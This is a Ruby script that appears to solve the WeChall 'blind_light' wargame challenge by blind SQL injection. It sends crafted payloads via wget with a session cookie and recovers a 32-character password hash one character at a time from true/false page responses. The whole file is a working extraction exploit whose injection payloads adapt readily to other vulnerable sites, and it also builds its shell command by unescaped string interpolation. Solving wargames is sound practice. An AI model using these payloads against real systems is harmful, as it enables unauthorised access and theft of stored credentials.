require 'open-uri'

#CHANGE this based on your cookie
$cookie = "WC=randomcharsandstuff"


#Some general variables
url = "http://www.wechall.net/challenge/blind_light/index.php"
correct = "<li>Welcome back, user."
wrong = "<li>Your password is wrong, user."
$how_many_total = 0
$hash = ""

#This method gets the result back from the server
def wget(url, post_data)
	wget = "wget -O - -q #{url} " \
	"--header=\"Referer: http://www.wechall.net/challenge/blind_lighter/index.php\" " \
	"--header=\"Cookie: #{$cookie}\" " \
	"--post-data \"injection=#{post_data}&inject=Inject\""
	$how_many_total += 1
	return `#{wget}`
end



for n in 1..32
	#testing weather the char is a num or a character
	#if true, then a number, if false then a character
	post_data = "kk' or " \
				"(ASCII(LOWER(substring(b.password, #{n}, 1)))) = " \
				"(ASCII(substring(b.password, #{n}, 1)));-- -"
	grep = wget(url, URI::encode(post_data))
		
	char_set = [];

	#if correct, then number
	if grep.to_s.include? correct
	#check if the number is larger than 4
		post_data = "kk' or " \
				"(ASCII(substring(b.password, #{n}, 1))) > " \
				"ASCII('4');-- -"
		grep = wget(url, URI::encode(post_data))

		#if the number is larger than 4
		if grep.to_s.include? correct
			char_set = ["5", "6", "7", "8", "9"]
		else
		#if the number is smaller or equal 4
			char_set = ["0", "1", "2", "3", "4"]
		end

	#if wrong, then char
	elsif grep.to_s.include? wrong
	#check if the char is larger than C
		post_data = "kk' or " \
				"(ASCII(substring(b.password, #{n}, 1))) > " \
				"ASCII('C');-- -"
		grep = wget(url, URI::encode(post_data))
		#if the char is larger than C
		if grep.to_s.include? correct
			char_set = ["D", "E", "F",]
		else
		#if the char is smaller or equal C
			char_set = ["A", "B", "C"]
		end
	end
	#Go over the charset one by one
	char_set.each do |t|
		post_data = "kk' or " \
				"substring(b.password, #{n}, 1) = " \
				"'#{t}';-- -"
		grep = wget(url, URI::encode(post_data))
		#if the char is the correct one, print it and append it to the global hash variable
		if grep.to_s.include? correct
			puts "char number #{n} is:#{t}"
			$hash = $hash + t.to_s
			break
		end
	end



end

puts "number of trails were: #{$how_many_total}"
puts $hash

